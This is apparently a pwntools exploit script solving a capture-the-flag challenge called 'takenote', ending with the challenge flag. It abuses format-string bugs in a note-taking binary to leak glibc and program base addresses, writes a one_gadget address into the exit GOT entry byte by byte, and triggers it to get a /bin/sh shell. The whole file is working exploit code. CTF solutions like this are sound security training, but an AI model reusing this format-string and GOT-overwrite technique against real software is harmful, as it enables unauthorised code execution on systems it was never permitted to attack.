from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chal_patched', '''
    b *(run+619)
    continue
''')

# p = remote('takenote.kctf-453514-codelab.kctf.cloud', 1337)

def init_num_notes(num_notes):
    p.sendlineafter(b"How many notes do you need to write?\n\n", str(num_notes).encode())

def write_note(index, data):
    p.sendlineafter(b"3. Exit\n\n", b'1')
    p.sendlineafter(b"]\n", str(index).encode())
    p.sendline(data)

def read_note(index):
    p.sendlineafter(b"3. Exit\n\n", b'2')
    p.sendlineafter(b"Which note do you want to print?\n\n", str(index).encode())
    p.recvuntil(b"Your note reads:\n\n")
    return p.recvline().strip()

def exit():
    p.sendlineafter(b"3. Exit\n\n", b'3')

# 1. init 8 notes for following fmtstr operations
init_num_notes(8)

# 2. leak glibc base address with fmtstr
write_note(0, b'%23$p')
glibc_base_addr = int(read_note(0).decode(), 16)-0x24083
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# 3. leak elf base address with fmtstr
write_note(1, b'%14$p')
elf_base_addr = int(read_note(1).decode(), 16)-0x15b0
log.info(f"elf base address: {hex(elf_base_addr)}")

# 4. write one gadget address to exit@got with fmtstr
# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL || r15 is a valid argv
#   [rdx] == NULL || rdx == NULL || rdx is a valid envp
one_gadget_addr = glibc_base_addr+0xe3b01
exit_got_addr = elf_base_addr+0x3770
# since each format string is limited to 0x20 bytes, one gadget address has to be written into exit@got byte by byte
for i in range(6):
    note_index = i+2
    offset = i
    byte_value = ((one_gadget_addr)>>(8*i))&0xff
    write_note(note_index, fmtstr_payload(12, {exit_got_addr+offset: byte_value}))
    read_note(note_index)

# 5. trigger one gadget
exit()

p.interactive()

# wctf{m3m0ry_l4y0u7_1s_crUc1Al_f0r_3xpL01t5}